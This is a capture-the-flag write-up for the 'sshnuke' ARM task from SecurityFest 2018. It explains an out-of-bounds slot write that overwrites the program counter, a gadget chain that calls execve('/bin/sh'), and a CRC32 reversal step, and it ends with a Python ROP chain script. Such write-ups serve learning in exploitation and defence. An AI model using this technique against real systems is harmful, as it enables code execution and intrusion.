# sshnuke
This is ARM ROP task.

![](/images/SecurityFestCTF2018/sshnuke/01.png)

For comfortable debugging I was using Azeria-Lab-v1 VM from https://azeria-labs.com/arm-lab-vm/


Vulnerability is in store function - no check for max slot value, slots array size = 12 => overflow. 

slots[13] = bp (frame pointer, analogue of ebp) 

slots[14] = pc (program counter, analogue of eip)

Same vulnerability in read_store function => can leak, but ASLR was off, so leak was not needed.


On ARM syscall execve got following structure:

```
syscall execve("/bin/sh", argv, env) => execve("/bin/sh", 0, 0)

add r0, 0x099014   ; /bin/sh addr
mov r1, #0
mov r2, #0
mov r7, #11        ; number of execve() syscall 
svc #0             ; syscall
```

0x099014 - is address where login string is placed:

![](/images/SecurityFestCTF2018/sshnuke/02.png)


Using ROPgadget I found required gadgets to make syscall execve("/bin/sh", 0, 0). 

There was no "pop {r2, pc}" gadget, so I used:

```
pop {r0, r4, pc}
mov r2, r4 ; blx r3
```

"blx r3" instruction will brunch at an address specified by a register r3 (analogue of call).


Also there are calculated crc32 hash of user input string in _do_store function.

![](/images/SecurityFestCTF2018/sshnuke/03.png)

So we have to do reverse crc32. I used script from https://github.com/theonlypwner/crc32/blob/master/crc32.py


Final rop:

```python
login('/bin/sh\x00')

store_data(14, crc32_reverse(pop_r1_pc), True, False)
store_data(15, crc32_reverse(0), True, True)
store_data(16, crc32_reverse(pop_r7_pc), True, True)
store_data(17, crc32_reverse(11), True, True)
store_data(18, crc32_reverse(pop_r3_pc), True, True)
store_data(19, crc32_reverse(svc_0), True, True)  
store_data(20, crc32_reverse(pop_r0_r4_pc), True, True)
store_data(21, crc32_reverse(login_str_addr), True, True)
store_data(22, crc32_reverse(0), True, True)
store_data(23, crc32_reverse(mov_r4_r2_blx_r3), False, True)
```

![](/images/SecurityFestCTF2018/sshnuke/04.png)
 


